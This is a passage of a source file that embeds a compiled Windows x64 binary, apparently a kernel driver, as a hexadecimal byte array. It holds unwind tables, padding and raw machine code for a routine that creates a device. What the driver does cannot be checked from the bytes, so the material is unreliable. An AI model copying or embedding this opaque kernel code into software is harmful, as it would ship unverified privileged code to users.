		0x01, 0x23, 0x0B, 0x00, 0x23, 0xC4, 0x07, 0x00, 0x1E, 0x74, 0x08, 0x00, 0x13, 0x64, 0x09, 0x00, 0x0E, 0x54, 0x0A, 0x00, 0x09, 0x34, 0x0F, 0x00, 0x04, 0xA2, 0x00, 0x00, 0x01, 0x11, 0x05, 0x00, 0x11, 0x74, 0x06, 0x00, 0x0C, 0x34, 0x0B, 0x00,
		0x04, 0x62, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x00, 0x3A, 0x00, 0x00, 0x36, 0x3A, 0x00, 0x00, 0x48, 0x67, 0x00, 0x00, 0x21, 0x08, 0x02, 0x00, 0x08, 0x64, 0x10, 0x00, 0x00, 0x3A, 0x00, 0x00, 0x36, 0x3A, 0x00, 0x00, 0x48, 0x67, 0x00, 0x00,
		0x01, 0x19, 0x06, 0x00, 0x19, 0x74, 0x0F, 0x00, 0x14, 0x34, 0x15, 0x00, 0x0C, 0x01, 0x11, 0x00, 0x01, 0x22, 0x0E, 0x00, 0x22, 0xD4, 0x2B, 0x00, 0x1E, 0xC4, 0x2C, 0x00, 0x1A, 0x74, 0x2D, 0x00, 0x16, 0x64, 0x2E, 0x00, 0x12, 0x54, 0x2F, 0x00,
		0x0E, 0x34, 0x30, 0x00, 0x0A, 0x01, 0x31, 0x00, 0x01, 0x11, 0x05, 0x00, 0x11, 0x74, 0x09, 0x00, 0x0C, 0x34, 0x08, 0x00, 0x04, 0x42, 0x00, 0x00, 0x01, 0x06, 0x02, 0x00, 0x06, 0x32, 0x02, 0x30, 0x01, 0x06, 0x02, 0x00, 0x06, 0x32, 0x02, 0x30,
		0x01, 0x0A, 0x02, 0x00, 0x0A, 0x32, 0x06, 0x30, 0x01, 0x0E, 0x02, 0x00, 0x0E, 0x72, 0x0A, 0x30, 0x01, 0x24, 0x06, 0x00, 0x24, 0x74, 0xA3, 0x00, 0x20, 0x34, 0xA2, 0x00, 0x0A, 0x01, 0x9F, 0x00, 0x01, 0x04, 0x01, 0x00, 0x04, 0x62, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xCD, 0x5D, 0x20, 0xD2, 0x66, 0xD4, 0xFF, 0xFF, 0x32, 0xA2, 0xDF, 0x2D, 0x99, 0x2B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x10, 0x00, 0x00, 0x81, 0x10, 0x00, 0x00, 0xE0, 0x61, 0x00, 0x00, 0x90, 0x10, 0x00, 0x00, 0xDB, 0x10, 0x00, 0x00, 0xE8, 0x61, 0x00, 0x00,
		0xF0, 0x10, 0x00, 0x00, 0x3B, 0x11, 0x00, 0x00, 0xF0, 0x61, 0x00, 0x00, 0x50, 0x11, 0x00, 0x00, 0x03, 0x12, 0x00, 0x00, 0xF8, 0x61, 0x00, 0x00, 0x20, 0x12, 0x00, 0x00, 0xE0, 0x12, 0x00, 0x00, 0x08, 0x62, 0x00, 0x00, 0x30, 0x13, 0x00, 0x00,
		0xB8, 0x13, 0x00, 0x00, 0x40, 0x62, 0x00, 0x00, 0xC0, 0x13, 0x00, 0x00, 0x54, 0x1A, 0x00, 0x00, 0x48, 0x62, 0x00, 0x00, 0x60, 0x1A, 0x00, 0x00, 0x10, 0x1C, 0x00, 0x00, 0x58, 0x62, 0x00, 0x00, 0x50, 0x1D, 0x00, 0x00, 0x67, 0x1D, 0x00, 0x00,
		0x88, 0x62, 0x00, 0x00, 0x67, 0x1D, 0x00, 0x00, 0x88, 0x1D, 0x00, 0x00, 0x74, 0x62, 0x00, 0x00, 0x88, 0x1D, 0x00, 0x00, 0x9E, 0x1D, 0x00, 0x00, 0x64, 0x62, 0x00, 0x00, 0xC0, 0x1D, 0x00, 0x00, 0xD6, 0x1D, 0x00, 0x00, 0x94, 0x62, 0x00, 0x00,
		0x70, 0x1E, 0x00, 0x00, 0x92, 0x1E, 0x00, 0x00, 0x9C, 0x62, 0x00, 0x00, 0xA0, 0x1E, 0x00, 0x00, 0xBF, 0x1E, 0x00, 0x00, 0xA4, 0x62, 0x00, 0x00, 0x30, 0x1F, 0x00, 0x00, 0xEF, 0x1F, 0x00, 0x00, 0xAC, 0x62, 0x00, 0x00, 0x30, 0x20, 0x00, 0x00,
		0xB7, 0x21, 0x00, 0x00, 0xB4, 0x62, 0x00, 0x00, 0xC0, 0x21, 0x00, 0x00, 0x0D, 0x22, 0x00, 0x00, 0xD4, 0x62, 0x00, 0x00, 0x20, 0x22, 0x00, 0x00, 0x4E, 0x22, 0x00, 0x00, 0x28, 0x63, 0x00, 0x00, 0x4E, 0x22, 0x00, 0x00, 0x73, 0x23, 0x00, 0x00,
		0x08, 0x63, 0x00, 0x00, 0x73, 0x23, 0x00, 0x00, 0xA1, 0x23, 0x00, 0x00, 0xF4, 0x62, 0x00, 0x00, 0xA1, 0x23, 0x00, 0x00, 0xBA, 0x23, 0x00, 0x00, 0xE4, 0x62, 0x00, 0x00, 0xC0, 0x23, 0x00, 0x00, 0x42, 0x24, 0x00, 0x00, 0x3C, 0x63, 0x00, 0x00,
		0x50, 0x24, 0x00, 0x00, 0x66, 0x24, 0x00, 0x00, 0x88, 0x63, 0x00, 0x00, 0x66, 0x24, 0x00, 0x00, 0x0A, 0x25, 0x00, 0x00, 0x68, 0x63, 0x00, 0x00, 0x0A, 0x25, 0x00, 0x00, 0x0F, 0x25, 0x00, 0x00, 0x58, 0x63, 0x00, 0x00, 0x20, 0x25, 0x00, 0x00,
		0x8D, 0x25, 0x00, 0x00, 0xBC, 0x63, 0x00, 0x00, 0x8D, 0x25, 0x00, 0x00, 0x43, 0x27, 0x00, 0x00, 0xA0, 0x63, 0x00, 0x00, 0x43, 0x27, 0x00, 0x00, 0x61, 0x27, 0x00, 0x00, 0x90, 0x63, 0x00, 0x00, 0x70, 0x27, 0x00, 0x00, 0x82, 0x27, 0x00, 0x00,
		0x18, 0x64, 0x00, 0x00, 0x82, 0x27, 0x00, 0x00, 0xCB, 0x27, 0x00, 0x00, 0x04, 0x64, 0x00, 0x00, 0xCB, 0x27, 0x00, 0x00, 0xD0, 0x27, 0x00, 0x00, 0xF4, 0x63, 0x00, 0x00, 0xD0, 0x27, 0x00, 0x00, 0xA6, 0x28, 0x00, 0x00, 0xD8, 0x63, 0x00, 0x00,
		0xB0, 0x28, 0x00, 0x00, 0xD1, 0x28, 0x00, 0x00, 0x20, 0x64, 0x00, 0x00, 0xE0, 0x28, 0x00, 0x00, 0xE9, 0x28, 0x00, 0x00, 0x68, 0x64, 0x00, 0x00, 0xE9, 0x28, 0x00, 0x00, 0x2E, 0x29, 0x00, 0x00, 0x54, 0x64, 0x00, 0x00, 0x2E, 0x29, 0x00, 0x00,
		0x33, 0x29, 0x00, 0x00, 0x44, 0x64, 0x00, 0x00, 0x33, 0x29, 0x00, 0x00, 0xB3, 0x29, 0x00, 0x00, 0x28, 0x64, 0x00, 0x00, 0xC0, 0x29, 0x00, 0x00, 0xF4, 0x29, 0x00, 0x00, 0xCC, 0x64, 0x00, 0x00, 0xF4, 0x29, 0x00, 0x00, 0x0F, 0x2A, 0x00, 0x00,
		0xB8, 0x64, 0x00, 0x00, 0x0F, 0x2A, 0x00, 0x00, 0x79, 0x2A, 0x00, 0x00, 0xA4, 0x64, 0x00, 0x00, 0x79, 0x2A, 0x00, 0x00, 0x92, 0x2A, 0x00, 0x00, 0x94, 0x64, 0x00, 0x00, 0x92, 0x2A, 0x00, 0x00, 0x96, 0x2A, 0x00, 0x00, 0x80, 0x64, 0x00, 0x00,
		0x96, 0x2A, 0x00, 0x00, 0xAF, 0x2A, 0x00, 0x00, 0x70, 0x64, 0x00, 0x00, 0xC0, 0x2A, 0x00, 0x00, 0xE0, 0x2A, 0x00, 0x00, 0x1C, 0x65, 0x00, 0x00, 0xE0, 0x2A, 0x00, 0x00, 0x49, 0x2B, 0x00, 0x00, 0x04, 0x65, 0x00, 0x00, 0x49, 0x2B, 0x00, 0x00,
		0x5A, 0x2B, 0x00, 0x00, 0xF0, 0x64, 0x00, 0x00, 0x5A, 0x2B, 0x00, 0x00, 0x69, 0x2B, 0x00, 0x00, 0xE0, 0x64, 0x00, 0x00, 0x70, 0x2B, 0x00, 0x00, 0x5A, 0x2C, 0x00, 0x00, 0x28, 0x65, 0x00, 0x00, 0x60, 0x2C, 0x00, 0x00, 0x5C, 0x2D, 0x00, 0x00,
		0x38, 0x65, 0x00, 0x00, 0x70, 0x2D, 0x00, 0x00, 0x89, 0x2D, 0x00, 0x00, 0xB4, 0x65, 0x00, 0x00, 0x89, 0x2D, 0x00, 0x00, 0xD0, 0x2E, 0x00, 0x00, 0x8C, 0x65, 0x00, 0x00, 0xD0, 0x2E, 0x00, 0x00, 0x97, 0x30, 0x00, 0x00, 0x74, 0x65, 0x00, 0x00,
		0x97, 0x30, 0x00, 0x00, 0xC9, 0x30, 0x00, 0x00, 0x64, 0x65, 0x00, 0x00, 0xC9, 0x30, 0x00, 0x00, 0xEF, 0x30, 0x00, 0x00, 0x50, 0x65, 0x00, 0x00, 0x10, 0x31, 0x00, 0x00, 0xA7, 0x32, 0x00, 0x00, 0xBC, 0x65, 0x00, 0x00, 0xB0, 0x32, 0x00, 0x00,
		0x3A, 0x33, 0x00, 0x00, 0x20, 0x66, 0x00, 0x00, 0x3A, 0x33, 0x00, 0x00, 0x65, 0x33, 0x00, 0x00, 0x0C, 0x66, 0x00, 0x00, 0x65, 0x33, 0x00, 0x00, 0x02, 0x35, 0x00, 0x00, 0xEC, 0x65, 0x00, 0x00, 0x02, 0x35, 0x00, 0x00, 0x17, 0x35, 0x00, 0x00,
		0xDC, 0x65, 0x00, 0x00, 0x17, 0x35, 0x00, 0x00, 0x33, 0x35, 0x00, 0x00, 0xCC, 0x65, 0x00, 0x00, 0x40, 0x35, 0x00, 0x00, 0x4B, 0x35, 0x00, 0x00, 0x64, 0x66, 0x00, 0x00, 0x4B, 0x35, 0x00, 0x00, 0xF4, 0x35, 0x00, 0x00, 0x48, 0x66, 0x00, 0x00,
		0xF4, 0x35, 0x00, 0x00, 0x2F, 0x36, 0x00, 0x00, 0x30, 0x66, 0x00, 0x00, 0x40, 0x36, 0x00, 0x00, 0x4B, 0x36, 0x00, 0x00, 0xA4, 0x66, 0x00, 0x00, 0x4B, 0x36, 0x00, 0x00, 0x00, 0x37, 0x00, 0x00, 0x88, 0x66, 0x00, 0x00, 0x00, 0x37, 0x00, 0x00,
		0x3A, 0x37, 0x00, 0x00, 0x70, 0x66, 0x00, 0x00, 0x40, 0x37, 0x00, 0x00, 0x7E, 0x37, 0x00, 0x00, 0xD4, 0x66, 0x00, 0x00, 0x7E, 0x37, 0x00, 0x00, 0xAC, 0x37, 0x00, 0x00, 0xC0, 0x66, 0x00, 0x00, 0xAC, 0x37, 0x00, 0x00, 0xBB, 0x37, 0x00, 0x00,
		0xB0, 0x66, 0x00, 0x00, 0xD0, 0x37, 0x00, 0x00, 0xA3, 0x38, 0x00, 0x00, 0xE0, 0x66, 0x00, 0x00, 0xB0, 0x38, 0x00, 0x00, 0x6F, 0x39, 0x00, 0x00, 0xF8, 0x66, 0x00, 0x00, 0x80, 0x39, 0x00, 0x00, 0xF1, 0x39, 0x00, 0x00, 0x14, 0x67, 0x00, 0x00,
		0x00, 0x3A, 0x00, 0x00, 0x36, 0x3A, 0x00, 0x00, 0x48, 0x67, 0x00, 0x00, 0x36, 0x3A, 0x00, 0x00, 0x00, 0x3B, 0x00, 0x00, 0x34, 0x67, 0x00, 0x00, 0x00, 0x3B, 0x00, 0x00, 0x1A, 0x3B, 0x00, 0x00, 0x24, 0x67, 0x00, 0x00, 0x20, 0x3B, 0x00, 0x00,
		0xF8, 0x3C, 0x00, 0x00, 0x58, 0x67, 0x00, 0x00, 0x00, 0x3D, 0x00, 0x00, 0xEA, 0x3D, 0x00, 0x00, 0x78, 0x67, 0x00, 0x00, 0x00, 0x3E, 0x00, 0x00, 0x4F, 0x3E, 0x00, 0x00, 0x88, 0x67, 0x00, 0x00, 0x60, 0x3E, 0x00, 0x00, 0x9A, 0x3E, 0x00, 0x00,
		0x90, 0x67, 0x00, 0x00, 0xA0, 0x3E, 0x00, 0x00, 0xE6, 0x3E, 0x00, 0x00, 0x98, 0x67, 0x00, 0x00, 0xF0, 0x3E, 0x00, 0x00, 0x8E, 0x3F, 0x00, 0x00, 0xA0, 0x67, 0x00, 0x00, 0xA0, 0x3F, 0x00, 0x00, 0x64, 0x42, 0x00, 0x00, 0xA8, 0x67, 0x00, 0x00,
		0x70, 0x42, 0x00, 0x00, 0x9A, 0x42, 0x00, 0x00, 0xB8, 0x67, 0x00, 0x00, 0x10, 0x20, 0x5D, 0x00, 0x33, 0x20, 0x5D, 0x00, 0x34, 0x62, 0x00, 0x00, 0x33, 0x20, 0x5D, 0x00, 0x4E, 0x21, 0x5D, 0x00, 0x20, 0x62, 0x00, 0x00, 0x4E, 0x21, 0x5D, 0x00,
		0xF9, 0x21, 0x5D, 0x00, 0x10, 0x62, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xC4, 0x48, 0x83, 0xEC, 0x68, 0x48, 0x89, 0x58, 0x18, 0x48, 0x8B, 0xD9, 0x4C, 0x8D, 0x05, 0xAB, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x74, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x5D,
		0x02, 0x00, 0x00, 0x48, 0x89, 0x78, 0x20, 0xE8, 0xF4, 0xFE, 0xA2, 0xFF, 0x33, 0xFF, 0x48, 0x8D, 0x05, 0x7B, 0xDE, 0xFE, 0xFF, 0x89, 0x3D, 0xD5, 0x50, 0xA3, 0xFF, 0xBA, 0x00, 0x01, 0x00, 0x00, 0x40, 0x88, 0xB8, 0x08, 0x01, 0x00, 0x00, 0x48,
		0x89, 0x38, 0x48, 0x05, 0x10, 0x01, 0x00, 0x00, 0x48, 0xFF, 0xCA, 0x75, 0xEB, 0x48, 0x8D, 0x05, 0x24, 0xF0, 0xA2, 0xFF, 0x48, 0x8D, 0x0D, 0xDD, 0x59, 0xE0, 0xFF, 0xBA, 0x50, 0xC3, 0x00, 0x00, 0x48, 0x89, 0x43, 0x70, 0x48, 0x8D, 0x05, 0x6D,
		0xF0, 0xA2, 0xFF, 0x48, 0x89, 0x83, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xBF, 0xF0, 0xA2, 0xFF, 0x48, 0x89, 0x83, 0xE0, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x71, 0xEF, 0xA2, 0xFF, 0x48, 0x89, 0x43, 0x68, 0x48, 0x8D, 0x05, 0x9E, 0x50,
		0xA3, 0xFF, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x89, 0x78, 0xF8, 0x48, 0x89, 0x38, 0x48, 0x89, 0x78, 0x10, 0x48, 0x89, 0x78, 0x08, 0x89, 0x78, 0x20, 0x89, 0x78, 0x24, 0x48, 0x89, 0x78, 0x18, 0x48, 0x89, 0x78, 0x28, 0x48, 0x89, 0x78, 0x30,
		0x48, 0x89, 0x78, 0x38, 0x48, 0x89, 0x78, 0x40, 0x48, 0x89, 0x79, 0x08, 0x48, 0x89, 0x39, 0x48, 0x89, 0x79, 0xF0, 0x48, 0x89, 0x79, 0xF8, 0x48, 0x89, 0x79, 0x10, 0x48, 0x83, 0xC0, 0x50, 0x48, 0x83, 0xC1, 0x28, 0x48, 0xFF, 0xCA, 0x75, 0xB8,
		0x48, 0x8D, 0x0D, 0xE1, 0x27, 0xA3, 0xFF, 0xE8, 0x2C, 0xFE, 0xA2, 0xFF, 0x48, 0x8D, 0x15, 0xB5, 0x27, 0xA3, 0xFF, 0x48, 0x8D, 0x4C, 0x24, 0x40, 0xFF, 0x15, 0x8A, 0x3F, 0xA3, 0xFF, 0x4C, 0x8D, 0x5C, 0x24, 0x70, 0x4C, 0x8D, 0x44, 0x24, 0x40,
		0x4C, 0x89, 0x5C, 0x24, 0x30, 0x41, 0xB9, 0x86, 0x80, 0x00, 0x00, 0xBA, 0x18, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0x40, 0x88, 0x7C, 0x24, 0x28, 0x89, 0x7C, 0x24, 0x20, 0xFF, 0x15, 0xDE, 0x3E, 0xA3, 0xFF, 0x48, 0x8B, 0xBC, 0x24, 0x88, 0x00,
		0x00, 0x00, 0x85, 0xC0, 0x79, 0x15, 0x48, 0x8D, 0x0D, 0x2B, 0x27, 0xA3, 0xFF, 0x8B, 0xD0, 0xE8, 0xD4, 0xFD, 0xA2, 0xFF, 0xB8, 0x01, 0x00, 0x00, 0xC0, 0xEB, 0x36, 0x48, 0x8B, 0x44, 0x24, 0x70, 0x48, 0x8D, 0x15, 0xF1, 0x26, 0xA3, 0xFF, 0x48,
		0x8D, 0x4C, 0x24, 0x50, 0x48, 0x89, 0x43, 0x08, 0x48, 0x8B, 0x58, 0x40, 0x48, 0x89, 0x03, 0xFF, 0x15, 0x1B, 0x3F, 0xA3, 0xFF, 0x48, 0x8D, 0x54, 0x24, 0x40, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0xFF, 0x15, 0x83, 0x3E, 0xA3, 0xFF, 0x85, 0xC0, 0x79,
		0x1B, 0x48, 0x8D, 0x0D, 0x80, 0x26, 0xA3, 0xFF, 0x8B, 0xD0, 0xE8, 0x89, 0xFD, 0xA2, 0xFF, 0x48, 0x8B, 0x4C, 0x24, 0x70, 0xFF, 0x15, 0x86, 0x3F, 0xA3, 0xFF, 0xEB, 0x1E, 0x48, 0x8B, 0x44, 0x24, 0x70, 0x83, 0x48, 0x30, 0x04, 0x48, 0x8B, 0x44,
		0x24, 0x70, 0x81, 0x60, 0x30, 0x7F, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x44, 0x24, 0x70, 0x48, 0x89, 0x43, 0x08, 0x48, 0x8D, 0x0D, 0x17, 0x26, 0xA3, 0xFF, 0xE8, 0x52, 0xFD, 0xA2, 0xFF, 0x48, 0x8D, 0x0D, 0x7B, 0x00, 0x00, 0x00, 0xE8, 0x46, 0xFD,
		0xA2, 0xFF, 0x48, 0x8B, 0x9C, 0x24, 0x80, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x68, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0x05, 0x01, 0x4F, 0xA3, 0xFF, 0x49, 0xB9, 0x32, 0xA2, 0xDF, 0x2D, 0x99, 0x2B, 0x00,
		0x00, 0x48, 0x85, 0xC0, 0x74, 0x05, 0x49, 0x3B, 0xC1, 0x75, 0x2F, 0x4C, 0x8D, 0x05, 0xE6, 0x4E, 0xA3, 0xFF, 0x48, 0xB8, 0x20, 0x03, 0x00, 0x00, 0x80, 0xF7, 0xFF, 0xFF, 0x48, 0x8B, 0x00, 0x49, 0x33, 0xC0, 0x49, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF,
